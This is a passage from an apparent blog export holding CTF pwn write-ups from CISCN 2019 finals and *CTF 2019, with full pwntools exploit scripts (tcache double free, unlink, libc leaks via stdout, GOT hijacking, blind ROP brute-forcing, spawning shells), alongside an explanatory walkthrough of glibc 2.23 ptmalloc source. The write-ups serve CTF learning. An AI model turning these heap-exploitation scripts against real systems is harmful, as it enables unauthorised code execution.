p32(0x08048439) + p32(bss + 0x180) + p32(0x8048460) + p32(0x80489f9) + p32(3) + p32(bss + 0x300) + p32(5) + p32(0x80489fb) + p32(bss - 0x100) + p32(0x804893c)payload = payload.ljust(0x100, "\x00")payload += datapayload = payload.ljust(0x180, "\x00")payload += "flag\x00"edit(2, payload)delete(3)print show(0)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-ciscn-2019-finals-pwn]]></title>
    <url>%2Fposts%2Faed37b2f%2F</url>
    <content type="text"><![CDATA[c08 首先绕过tcache,然后unlink获取bss指针,获得任意写. 利用tcache进行double free分配chunk到_IO_2_1_stdout_上泄露libc.劫持free@got获得shell. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879from pwn import *context(os="linux", arch="amd64")context.log_level = 'debug'def add(index, size, content): r.sendline('1') r.sendlineafter('index: ', str(index)) r.sendlineafter('size: ', str(size)) r.sendafter('content: ', content) r.recvuntil('your choice: ')def edit(index, content): r.sendline('3') r.sendlineafter('index: ', str(index)) r.sendafter('content: ', str(content)) r.recvuntil('your choice: ')def delete(index): r.sendline('2') r.sendlineafter('index: ', str(index)) r.recvuntil('your choice: ')def leave(string): r.sendline('4')#r = process('./pwn')r = remote("172.16.9.21", "9008")r.recvuntil('your choice: ')add(0x10, 0x40, "0")add(1, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")add(3, 0x80, "0")delete(3)delete(3)delete(3)delete(3)delete(3)delete(3)delete(3)add(2, 0x30, "0")edit(0, p64(0) + p64(0x31) + p64(0x6020E0 - 0x18) + p64(0x6020E0 - 0x10) + "0" * 0x10 + p64(0x30) + p64(0x90))delete(1)edit(8, p64(0) * 4 + p64(0x6020e8))add(3, 0x100, "0")edit(8, p64(0x6020e8) + p8(0x32))delete(2)delete(2)add(2, 0x30, p64(0x6020a0))add(2, 0x30, p64(0x6020a0))add(2, 0x30, p8(0x60))r.sendline('1')r.sendlineafter('index: ', str(2))r.sendlineafter('size: ', str(0x30))r.sendafter('content: ', p64(0xfbad2887) + p64(0x602020) * 4)libc = u64(r.recvuntil("your choice: ")[:6].ljust(8, '\0')) - 0x809c0print "libc: " + hex(libc)edit(8, p64(0x6020e8) + p64(0x602015))edit(5, p64(0) + p64(libc + 0x4f440))add(7, 0x50, "/bin/sh\x00")r.sendline('2')r.sendlineafter('index: ', str(7))#gdb.attach(r)r.interactive() c17 首先构造一个数绕过检验,然后逆加密shellcode即可(其实\x00截断就行). 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *context(os="linux", arch="amd64")#context.log_level = 'debug'#r = process('./pwn')r = remote("172.16.9.24", "9017")r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', '-16777216')r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendlineafter('&gt;', 'hhh')r.sendlineafter('&gt;', '2')r.sendlineafter('&gt;', '2')r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', p8(0x90))r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', p8(0x90))r.sendlineafter('&gt;', '1')r.sendlineafter('&gt;', str(0x30))r.sendafter('&gt;', 'The cake is a lie!\x00')r.sendlineafter('&gt;', '3')payload = asm(shellcraft.sh()) + "\x7f" * 2print payloada = len(payload)b = '\x7f'for i in range(0, a - 1): b = b + chr(ord(payload[i]) ^ ord(b[i]))print bc = ''for i in range(0, a - 2): c = c + chr(ord(b[i + 1]) ^ ord(b[i]))print cr.sendafter('&gt;', b)r.interactive()]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-RTFSC-Linux-glibc-2.23-初始化与结构体]]></title>
    <url>%2Fposts%2F72d9d99d%2F</url>
    <content type="text"><![CDATA[前言 基于glibc-2.23. ptmalloc内存管理结构体 ptmalloc使用malloc_state结构体来管理分配区. 使用malloc_par结构体进行参数管理,全局拥有一个唯一的malloc_par实例. 使用chunk来组织分配区的内存.使用heap_info在非主分配区模拟堆. malloc_state 1234567891011121314struct malloc_state &#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS * 2 - 2]; unsigned int binmap[BINMAPSIZE]; struct malloc_state *next; struct malloc_state *next_free; INTERNAL_SIZE_T attached_threads; INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; flags记录了分配区的一些标志. bit0为0,表示分配区中有fast bin chunk,为1表示没有.初始化完成后的malloc_state实例中flags值为0,但实际上没有fast bin chunk,在第一次调用函数malloc_consolidate()对fast bins进行chunk合并时,如果global_max_fast大于0,会调用clear_fastchunks宏,标志该分配区中已经没有fast bin chunk. bit1如果为0,表示MORCORE返回连续虚拟地址空间,bit1为1,表示MORCORE返回非连续虚拟地址空间.对于主分配区,MORECORE其实为sbrk(),默认返回连续虚拟地址空间;对于非主分配区,使用mmap()分配大块虚拟内存,然后进行切分来模拟主分配区的行为,而默认情况下mmap映射区域是不保证虚拟地址空间连续的,所以非住分配区默认分配非连续虚拟地址空间. fastbinsY拥有10(NFASTBINS)个元素的数组,用于存放每个fast chunk链表头指针.top指向分配区的top chunk.last_remainder指向分配区的last_remainder chunk.bins数组用于存储unstored bin,small bins和large bins的chunk链表头. binmap字段是一个int数组,ptmalloc用一个bit来标识该bit对应的bin中是否包含空闲chunk,方便查找. next字段用于将分配区以单向链表链接起来.next_free字段用于将空闲的分配区链接在单向链表中. system_mem字段记录了当前分配区已经分配的内存大小.max_system_mem记录了当前分配区最大能分配的内存大小. malloc_par 123456789101112131415struct malloc_par &#123; unsigned long trim_threshold; INTERNAL_SIZE_T top_pad; INTERNAL_SIZE_T mmap_threshold; INTERNAL_SIZE_T arena_test; INTERNAL_SIZE_T arena_max; int n_mmaps; int n_mmaps_max; int max_n_mmaps; int no_dyn_threshold; INTERNAL_SIZE_T mmapped_mem; INTERNAL_SIZE_T max_mmapped_mem; INTERNAL_SIZE_T max_total_mem; char *sbrk_base;&#125;; trim_threshold字段表示收缩阈值,默认为128KB,当每个分配区的top chunk大小大于这个阈值时,在一定的条件下,调用free时会收缩内存,减小top chunk的大小. top_pad字段表示在分配内存时是否添加额外的pad,默认该字段为0. mmap_threshold字段表示mmap分配阈值,默认值为128KB,由于默认开启mmap分配阈值动态调整,该字段的值会动态修改,但不会超过最大值,在32位系统上最大值为512KB,64位系统上的最大值为32MB. 在32位系统上arena_test默认值为2,64位系统上的默认值为8,当每个进程的分配区数量小于等于arena_test时,不会重用已有的分配区.arena_max为分配区的最大数量,当系统中的分配区数量达到arena_max,就不会再创建新的分配区,只会重用已有的分配区. n_mmaps字段表示当前进程使用mmap()函数分配的内存块的个数.n_mmaps_max字段表示进程使用mmap()函数分配的内存块的最大数量,默认值为65536,可以使用mallopt()函数修改. max_n_mmaps字段表示当前进程使用mmap()函数分配的内存块的数量的最大值,有关系n_mmaps &lt;= max_n_mmaps成立.mmapped_mem和max_mmapped_mem都用于统计mmap分配的内存大小,一般情况下两个字段的值相等,max_n_mmaps,max_mmapped_mem用于mstats()函数. no_dyn_threshold字段表示是否开启mmap分配阈值动态调整机制,默认值为0,也就是默认开启mmap分配阈值动态调整机制. pagesize字段表示系统的页大小,默认为4KB.max_total_mem字段在单线程情况下用于统计进程分配的内存总数.sbrk_base字段表示堆的起始地址. chunk 12345678910111213141516#ifndef INTERNAL_SIZE_T#define INTERNAL_SIZE_T size_t#endif...struct malloc_chunk &#123; INTERNAL_SIZE_T prev_size; INTERNAL_SIZE_T size; struct malloc_chunk* fd; struct malloc_chunk* bk; struct malloc_chunk* fd_nextsize; struct malloc_chunk* bk_nextsize;&#125;; heap_info 123456789typedef struct malloc_state *mstate;typedef struct _heap_info &#123; mstate ar_ptr; struct _heap_info *prev; size_t size; size_t mprotect_size; char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; ar_ptr是指向所属分配区的指针. prev字段用于将同一个分配区中的sub_heap用单向链表链接起来.prev指向链表中的前一个sub_heap. size字段表示当前sub_heap中的内存大小,以page对齐. mprotect_size字段表示当前sub_heap中被读写保护的内存大小,也就是说还没有被分配的内存大小. Pad字段用于保证sizeof (heap_info) + 2 * SIZE_SZ是按MALLOC_ALIGNMENT对齐的. 如果sub_heap是非主分配区的第一个sub_heap,heap_info存放在sub_heap的头部,紧跟heap_info之后是该非主分配区的malloc_state实例,紧跟malloc_state实例后,是sub_heap中的第一个chunk,但chunk的首地址必须按照MALLOC_ALIGNMENT对齐,所以在malloc_state实例和第一个chunk之间可能有几个字节的pad. 如果sub_heap不是非主分配区的第一个sub_heap,则紧跟heap_info后是第一个chunk,但sysmalloc()函数默认heap_info是按照MALLOC_ALIGNMENT对齐的,没有再做对齐的工作,直接将heap_info后的内存强制转换成一个chunk. 12345#define heap_for_ptr(ptr) \ ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))#define arena_for_chunk(ptr) \ (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena) sub_heap的内存块使用mmap()函数分配,并以4k对齐,所以可以根据chunk的指针地址,获得这个chunk所属的sub_heap的地址. heap_for_ptr宏就是根据chunk的地址获得sub_heap的地址. sub_heap的头部存放的是heap_info实例,其中保存了分配区指针,可以通过chunk的地址获得分配区的地址,前提是这个chunk属于非主分配区,arena_for_chunk用来做这样的转换. 12345678#define HEAP_MIN_SIZE (32 * 1024)#ifndef HEAP_MAX_SIZE# ifdef DEFAULT_MMAP_THRESHOLD_MAX# define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX)# else# define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */# endif#endif HEAP_MIN_SIZE定义了sub_heap内存块的最小值,32KB. HEAP_MAX_SIZE定义了sub_heap内存块的最大值,在32位系统上,HEAP_MAX_SIZE默认值为1MB,64位为64MB. ptmalloc初始化 ptmalloc的初始化发生在进程的第一个内存分配请求.在ptmalloc中malloc()函数的实际接口函数为__libc_malloc(),这个函数最开始会执行如下的一段代码. 123void *(*hook)(size_t, const void *) = atomic_forced_read(__malloc_hook);if (__builtin_expect(hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); 在定义了__malloc_hook()全局函数的情况下,只是执行__malloc_hook().在进程初始化时__malloc_hook指向的函数为malloc_hook_ini(). 1void * weak_variable (*__malloc_hook)(size_t __size, const void *) = malloc_hook_ini; malloc_hook_ini()函数定义在hooks.c中,实现代码如下. 12345static void * malloc_hook_ini(size_t sz, const void * caller) &#123; __malloc_hook = NULL; ptmalloc_init(); return __libc_malloc(sz);&#125; ptmalloc_init. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970static void ptmalloc_init (void) &#123; if (__malloc_initialized &gt;= 0) return; __malloc_initialized = 0;#ifdef SHARED Dl_info di; struct link_map *l; if (_dl_open_hook != NULL || (_dl_addr (ptmalloc_init, &amp;di, &amp;l, NULL) != 0 &amp;&amp; l-&gt;l_ns != LM_ID_BASE)) __morecore = __failing_morecore;#endif thread_arena = &amp;main_arena; thread_atfork(ptmalloc_lock_all, ptmalloc_unlock_all, ptmalloc_unlock_all2); const char *s = NULL; if (__glibc_likely (_environ != NULL)) &#123; char **runp = _environ; char *envline; while (__builtin_expect ((envline = next_env_entry (&amp;runp)) != NULL, 0)) &#123; size_t len = strcspn (envline, "="); if (envline[len] != '=') continue; switch (len) &#123; case 6: if (memcmp (envline, "CHECK_", 6) == 0) s = &amp;envline[7]; break; case 8: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "TOP_PAD_", 8) == 0) __libc_mallopt (M_TOP_PAD, atoi (&amp;envline[9])); else if (memcmp (envline, "PERTURB_", 8) == 0) __libc_mallopt (M_PERTURB, atoi (&amp;envline[9])); &#125; break; case 9: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "MMAP_MAX_", 9) == 0) __libc_mallopt (M_MMAP_MAX, atoi (&amp;envline[10])); else if (memcmp (envline, "ARENA_MAX", 9) == 0) __libc_mallopt (M_ARENA_MAX, atoi (&amp;envline[10])); &#125; break; case 10: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "ARENA_TEST", 10) == 0) __libc_mallopt (M_ARENA_TEST, atoi (&amp;envline[11])); &#125; break; case 15: if (!__builtin_expect (__libc_enable_secure, 0)) &#123; if (memcmp (envline, "TRIM_THRESHOLD_", 15) == 0) __libc_mallopt (M_TRIM_THRESHOLD, atoi (&amp;envline[16])); else if (memcmp (envline, "MMAP_THRESHOLD_", 15) == 0) __libc_mallopt (M_MMAP_THRESHOLD, atoi (&amp;envline[16])); &#125; break; default: break; &#125; &#125; &#125; if (s &amp;&amp; s[0]) &#123; __libc_mallopt (M_CHECK_ACTION, (int) (s[0] - '0')); if (check_action != 0) __malloc_check_init (); &#125; void (*hook) (void) = atomic_forced_read (__malloc_initialize_hook); if (hook != NULL) (*hook)(); __malloc_initialized = 1;&#125; 首先检查全局变量__malloc_initialized是否大于等于0.该值大于0,表示已经初始化完成;为0,表示正在初始化. 如果Glibc库不在默认名字空间,或是用户程序是静态编译的并调用了dlopen函数加载Glibc库中的ptmalloc_init(),这种情况下的ptmalloc不允许使用sbrk()分配内存,只需修改__morecore函数指针指向__failing_morecore就可以了,__morecore默认指向sbrk(). 然后将调用ptmalloc_init()的线程的thread_arena绑定到主分配区上.意味着本线程首选从主分配区分配内存.然后调用thread_atfork()设置当前进程在fork子线程时处理mutex的回调函数,在本进程fork子线程时,调用ptmalloc_lock_all()获得所有分配区的锁,禁止所有分配区分配内存,当子线程创建完毕,父进程调用ptmalloc_unlock_all()重新unlock每个分配区的锁mutex,子线程调用ptmalloc_unlock_all2()重新初始化每个分配区的锁mutex. 从环境变量中读取相应的配置参数值并调用mallopt()函数设置相应的选项.如果这段程序是在Glibc库初始化中执行的,会做更多的安全检查工作. 在ptmalloc_init()函数结束处,查看是否存在__malloc_initialize_hook函数,如果存在,执行该hook函数. 最后将全局变量__malloc_initialized设置为1,表示ptmalloc_init()已经初始化完成. 子线程的内存分配 123456789101112131415161718192021222324static void ptmalloc_lock_all (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; if (mutex_trylock (&amp;list_lock)) &#123; if (thread_arena == ATFORK_ARENA_PTR) goto out; (void) mutex_lock (&amp;list_lock); &#125; for (ar_ptr = &amp;main_arena;; ) &#123; (void) mutex_lock (&amp;ar_ptr-&gt;mutex); ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; save_malloc_hook = __malloc_hook; save_free_hook = __free_hook; __malloc_hook = malloc_atfork; __free_hook = free_atfork; save_arena = thread_arena; thread_arena = ATFORK_ARENA_PTR;out: ++atfork_recursive_cntr;&#125; 当父进程中的某个线程使用fork的机制创建子线程时,首先调用ptmalloc_lock_all()函数暂时对全局锁list_lock和所有的分配区加锁,从而保证分配区状态的一致性. ptmalloc_lock_all()函数首先检查ptmalloc是否已经初始化,如果没有初始化,退出. 然后尝试对全局锁list_lock加锁,直到获得全局锁list_lock对所有的分配区加锁.接着保存原有的分配释放函数,将malloc_atfork()和free_atfork()函数作为fork子线程期间所使用的内存分配释放函数,然后保存当前线程的私有实例中的原有分配区指针,将ATFORK_ARENA_PTR存放到当前线程的私有实例中,用于标识当前现在正在fork子线程. 对全局变量atfork_recursive_cntr加1,表示递归fork子线程的层数,保证父线程在fork子线程过程中,调用ptmalloc_unlock_all()函数加锁的次数与调用ptmalloc_lock_all()函数解锁的次数保持一致,同时也保证保证所有的子线程调用ptmalloc_unlock_all()函数加锁的次数与父线程调用ptmalloc_lock_all()函数解锁的次数保持一致,防止没有释放锁. 1234567891011121314151617static void ptmalloc_unlock_all (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; if (--atfork_recursive_cntr != 0) return; thread_arena = save_arena; __malloc_hook = save_malloc_hook; __free_hook = save_free_hook; for (ar_ptr = &amp;main_arena;; ) &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; (void) mutex_unlock (&amp;list_lock);&#125; 当进程的某个线程完成fork子线程后,父线程和子线程都调用ptmall_unlock_all()函数释放全局锁list_lock,释放所有分配区的锁. ptmall_unlock_all()函数首先检查ptmalloc是否初始化,如果没有初始化,退出. 接着将全局变量atfork_recursive_cntr减1,如果atfork_recursive_cntr为0,才继续执行,这保证了递归fork子线程只会解锁一次. 接着将当前线程的私有实例还原为原来的分配区,__malloc_hook和__free_hook还原为由来的hook函数.然后遍历所有分配区,依次解锁每个分配区,最后解锁list_lock. 123456789101112131415161718192021222324252627282930# ifdef __linux__static void ptmalloc_unlock_all2 (void) &#123; mstate ar_ptr; if (__malloc_initialized &lt; 1) return; thread_arena = save_arena; __malloc_hook = save_malloc_hook; __free_hook = save_free_hook; mutex_init (&amp;free_list_lock); if (save_arena != NULL) ((mstate) save_arena)-&gt;attached_threads = 1; free_list = NULL; for (ar_ptr = &amp;main_arena;; ) &#123; mutex_init (&amp;ar_ptr-&gt;mutex); if (ar_ptr != save_arena) &#123; ar_ptr-&gt;attached_threads = 0; ar_ptr-&gt;next_free = free_list; free_list = ar_ptr; &#125; ar_ptr = ar_ptr-&gt;next; if (ar_ptr == &amp;main_arena) break; &#125; mutex_init (&amp;list_lock); atfork_recursive_cntr = 0;&#125;# else# define ptmalloc_unlock_all2 ptmalloc_unlock_all# endif 函数ptmalloc_unlock_all2()被fork出的子线程调用,在Linux系统中,子线程(进程)unlock从父线程(进程)中继承的mutex不安全,会导致资源泄漏,但重新初始化mutex是安全的,所有增加了这个特殊版本用于Linux下的atfork handler. ptmalloc_unlock_all2()使用mutex_init()代替了mutex_unlock(),对于子线程来说,无论全局变量atfork_recursive_cntr的值是多少,都将该值设置为0,因为ptmalloc_unlock_all2()函数只会被子线程调用一次. 123456789101112131415161718192021# define ATFORK_ARENA_PTR ((void *) -1)static void * malloc_atfork (size_t sz, const void *caller) &#123; void *victim; if (thread_arena == ATFORK_ARENA_PTR) &#123; if (save_malloc_hook != malloc_check) &#123; return _int_malloc (&amp;main_arena, sz); &#125; else &#123; if (top_check () &lt; 0) return 0; victim = _int_malloc (&amp;main_arena, sz + 1); return mem2mem_check (victim, sz); &#125; &#125; else &#123; (void) mutex_lock (&amp;list_lock); (void) mutex_unlock (&amp;list_lock); return __libc_malloc (sz); &#125;&#125; 当父进程中的某个线程使用fork的机制创建子线程时,如果进程中的线程需要分配内存,将使用malloc_atfork()函数分配内存. malloc_atfork()函数首先查看自己的线程私有实例中的分配区指针,如果该指针为ATFORK_ARENA_PTR,意味着本线程正在fork新线程,并锁住了全局锁list_lock和每个分配区,如果在fork线程的分配函数不是处于check模式,直接调用内部分配函数_int_malloc().否则在分配内存的同时做检查. 如果线程私有实例中的指针不是ATFORK_ARENA_PTR,意味着有另外的线程在fork子线程,当前线程只能等待fork子线程的线程完成分配,于是等待获得全局锁list_lock,如果获得全局锁成功,表示fork子线程的线程已经完成fork操作,释放全局锁list_lock并调用__libc_malloc()分配内存. 12345678910111213static void free_atfork (void *mem, const void *caller) &#123; mstate ar_ptr; mchunkptr p; if (mem == 0) return; p = mem2chunk (mem); if (chunk_is_mmapped (p)) &#123; munmap_chunk (p); return; &#125; ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, thread_arena == ATFORK_ARENA_PTR);&#125; 当父进程中的某个线程使用fork的机制创建子线程时,如果进程中的线程需要释放内存,将使用free_atfork()函数释放内存. free_atfork()函数首先通过需free的内存块指针获得chunk的指针,如果该chunk是通过mmap分配的,调用munmap()释放该chunk. 否则先根据chunk指针获得分配区指针,然后调用_int_free()函数(参数中有本线程是否正在fork新线程). 多分配区支持 非主分配区使用mmap()函数分配内存来模拟堆(sub-heap),所有的从非主分配区总分配的小内存块都从sub-heap中切分出来,如果一个sub-heap的内存用光了,或是sub-heap中的内存不够用时,使用mmap()分配一块新的内存块作为sub-heap,并将新的sub-heap链接在非主分配区中sub-heap的单向链表中. 非主分配区中的sub-heap同样会进行收缩,将sub-heap中top chunk的一部分返回给操作系统,如果top chunk为整个sub-heap,会把整个sub-heap还回给操作系统.收缩堆的条件是当前free的chunk大小加上前后能合并chunk的大小大于64KB,并且top chunk的大小达到mmap收缩阈值,才有可能收缩堆. 为了保证分配区的线程安全,对分配区的访问需要锁保护,当线程获得分配区的锁时,可以使用该分配区分配内存,并将该分配区的指针保存在线程的私有实例中. 线程需要调用malloc分配内存空间时,该线程先查看线程私有变量中是否已经存在一个分配区,如果存在,尝试对该分配区加锁,如果加锁成功,使用该分配区分配内存,如果失败,该线程搜分配区索循环链表试图获得一个空闲的分配区.如果所有的分配区都已经加锁,那么malloc会开辟一个新的分配区,把该分配区加入到分配区的全局分配区循环链表并加锁,然后使用该分配区进行分配操作,如果不能开辟新的分配区则等待.在回收操作中,线程同样试图获得待回收块所在分配区的锁,如果该分配区正在被别的线程使用,则需要等待直到其他线程释放该分配区的互斥锁之后才可以进行回收操作. 分配区初始化 ptmalloc定义了如下几个全局变量. 1234567891011121314151617181920static struct malloc_state main_arena =&#123; .mutex = _LIBC_LOCK_INITIALIZER, .next = &amp;main_arena, .attached_threads = 1&#125;;static struct malloc_par mp_ =&#123; .top_pad = DEFAULT_TOP_PAD, .n_mmaps_max = DEFAULT_MMAP_MAX, .mmap_threshold = DEFAULT_MMAP_THRESHOLD, /*128k*/ .trim_threshold = DEFAULT_TRIM_THRESHOLD, /*128k*/#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8)) .arena_test = NARENAS_FROM_NCORES (1)&#125;;static INTERNAL_SIZE_T global_max_fast; main_arena表示主分配区,任何进程有且仅有一个全局的主分配区,mp_是全局唯一的一个malloc_par实例,用于管理参数和统计信息,global_max_fast全局变量表示fast bins中最大的chunk大小. 分配区初始化函数. 12345678910111213141516static void malloc_init_state (mstate av) &#123; int i; mbinptr bin; for (i = 1; i &lt; NBINS; ++i) &#123; bin = bin_at (av, i); bin-&gt;fd = bin-&gt;bk = bin; &#125;#if MORECORE_CONTIGUOUS if (av != &amp;main_arena)#endif set_noncontiguous (av); if (av == &amp;main_arena) set_max_fast (DEFAULT_MXFAST); av-&gt;flags |= FASTCHUNKS_BIT; av-&gt;top = initial_top (av);&#125; 初始化函数首先遍历所有的bins,初始化每个bin的空闲链表为空,即将bin的fb和bk都指向bin本身. 由于av中所有字段默认为0,即默认分配连续的虚拟地址空间,但只有主分配区才能分配连续的虚拟地址空间,所以对于非主分配区,需要设置为分配非连续虚拟地址空间. 如果初始化的是主分配区,需要设置fast bins中最大chunk大小,由于主分配区只有一个,并且一定是最先初始化,这就保证了对全局变量global_max_fast只初始化了一次,只要该全局变量的值非0,也就意味着主分配区初始化了.然后标识此时分配区无fast bins. 最后初始化top chunk.对top chunk的初始化即暂时把top chunk初始化为unsort chunk,仅仅是初始化一个值而已,这个chunk的内容肯定不能用于top chunk来分配内存,主要原因是top chunk不属于任何bin,但ptmalloc中的一些check代码,可能需要top chunk属于一个合法的bin. 获取分配区 为了支持多线程,ptmalloc定义了如下的全局变量. 12345678910static __thread mstate thread_arena attribute_tls_model_ie;static mutex_t list_lock = _LIBC_LOCK_INITIALIZER;static mutex_t free_list_lock = _LIBC_LOCK_INITIALIZER;static size_t narenas = 1;static mstate free_list;static unsigned long arena_mem;int __malloc_initialized = -1; thread_arena存放的是线程的私用实例,该私有实例保存的是分配区(arena)的malloc_state实例的指针.thread_arena指向的可能是主分配区的指针,也可能是非主分配区的指针. list_lock用于同步分配区的单向环形链表. narenas全局变量表示当前分配区的数量,free_list全局变量是空闲分配区的单向链表,这些空闲的分配区可能是从父进程那里继承来的. arena_mem记录了非主分配区所分配的内存大小. __malloc_initializd全局变量用来标识是否ptmalloc已经初始化了,其值大于0时表示已经初始化. ptmalloc使用如下的宏来获得分配区. 1234567891011#define arena_get(ptr, size) do &#123; \ ptr = thread_arena; \ arena_lock (ptr, size); \ &#125; while (0)#define arena_lock(ptr, size) do &#123; \ if (ptr &amp;&amp; !arena_is_corrupt (ptr)) \ (void) mutex_lock (&amp;ptr-&gt;mutex); \ else \ ptr = arena_get2 ((size), NULL); \ &#125; while (0) arena_get获取线程的私有实例中的分配区指针,可能为NULL,然后调用arena_lock. arena_lock如果存在分配区指针且不冲突则直接对该分配区加锁,否则加锁失败调用arena_get2.]]></content>
      <categories>
        <category>CS</category>
        <category>RTFSC</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[writeup-starctf-2019-pwn]]></title>
    <url>%2Fposts%2F708790b2%2F</url>
    <content type="text"><![CDATA[blindpwn 题目信息. 123456789101112checksec:Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)file libc:libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb2 尝试发现有栈溢出漏洞,重复测试测出偏移,寻找useful gadget. 123456789101112131415161718192021222324252627282930313233from pwn import *context.log_level = 'debug'offset = 0x28padding = "a" * offsetaddrs = []def find_gadget(addr): fd = open("gadget.txt", 'a') fd.write(hex(addr) + '\n') fd.close()for addr in range(0x4008df, 0x401AA0, 0x1): r = remote("34.92.37.22", 10000) r.recvuntil("Welcome to this blind pwn!\n") payload = padding + p64(addr) log.info("now addr is " + hex(addr)) r.send(payload) try: msg = r.recvrepeat(12) if(msg != ""): log.success("find addr " + hex(addr)) print msg find_gadget(addr) addrs.append(addr) r.close() except EOFError as e: r.close() log.info("connection close at " + hex(addr))print addrs 发现有个地方是泄露加重放漏洞,写出exp. 1234567891011121314151617181920from pwn import *context.log_level = 'debug'offset = 0x28padding = "a" * offsetmain = 0x400570r = remote("34.92.37.22", 10000)r.recvuntil("Welcome to this blind pwn!\n")payload = padding + p64(0x400515) + p64(main)r.send(payload)libc = u64(r.recvuntil("Welcome to this blind pwn!\n")[0x48 : 0x4e].ljust(8, '\0')) - 0x20830print "libc " + hex(libc)payload = padding + p64(libc + 0x4526a) + p64(0) * 0x30r.send(payload)r.interactive() girlfriend 利用tcache容量限制绕过. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *def change_ld(binary, ld): binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) return ELF(path)context.log_level = 'debug'r = remote("34.92.96.238", "10001")#elf = change_ld('./chall', './ld-2.29.so')#r = elf.process(env = &#123;'LD_PRELOAD' : './libc.so.6'&#125;)def add(size, content, call): r.sendline("1") r.recvuntil("of girl's name\n") r.sendline(str(size)) r.recvuntil("her name:\n") r.sendline(content) r.recvuntil("input her call:\n") r.sendline(call) r.recvuntil("Input your choice:")def show(index): r.sendline("2") r.recvuntil("the index:\n") r.sendline(str(index)) data = r.recvuntil("Input your choice:") print data return datadef call(index): r.sendline("4") r.recvuntil("the index:\n") r.sendline(str(index)) r.recvuntil("Input your choice:")r.recvuntil("Input your choice:")add(0x500, "/bin/sh\x00", "/bin/sh\x00")#0i = 1while(i &lt; 10): i += 1 add(0x60, "/bin/sh\x00", "/bin/sh\x00")#1-9add(0x100, "/bin/sh\x00", "/bin/sh\x00")#10call(0)libc = u64(show(0)[6:12].ljust(8, '\0')) - 0x3b1ca0i = 1while(i &lt; 10): call(i) i += 1call(8)ptr = libc + 0x3b38c8 - 0x13i = 1while(i &lt; 8): i += 1 add(0x60, "/bin/sh\x00", "/bin/sh\x00")#1-9add(0x60, p64(ptr), p64(ptr))#11add(0x60, p64(ptr), p64(ptr))#12add(0x60, p64(ptr), p64(ptr))#13add(0x60, "\x00" * 0x13 + p64(libc + 0x41c30), "a" * 10)#13#gdb.attach(r)print "libc: " + hex(libc)r.sendline("4")r.recvuntil("the index:\n")r.sendline(str(10))r.interactive() change_ld 修改elf文件的PT_INTERP. 1234567891011121314151617181920212223242526272829from pwn import *def change_ld(binary, ld): if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\0')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = 